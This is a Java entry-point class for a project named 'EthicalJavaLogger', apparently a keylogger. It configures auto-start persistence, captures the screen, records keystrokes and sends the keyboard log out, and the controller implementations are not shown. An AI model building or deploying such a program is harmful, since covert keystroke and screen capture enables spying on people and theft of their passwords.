package com.mycompany.ethicaljavalogger;

import com.mycompany.ethicaljavalogger.controllers.AutoStartController;
import com.mycompany.ethicaljavalogger.controllers.KeyboardListenerController;
import com.mycompany.ethicaljavalogger.controllers.ScreenCaptureController;

public class EthicalJavaLogger {
    public static void main(String[] args) {
        new AutoStartController().configureAutoStart();
        new ScreenCaptureController().handleScreenCapture();
        new KeyboardListenerController().handleKeyboardListener();
        new KeyboardListenerController().handleSendKeyboardLog();
    }
}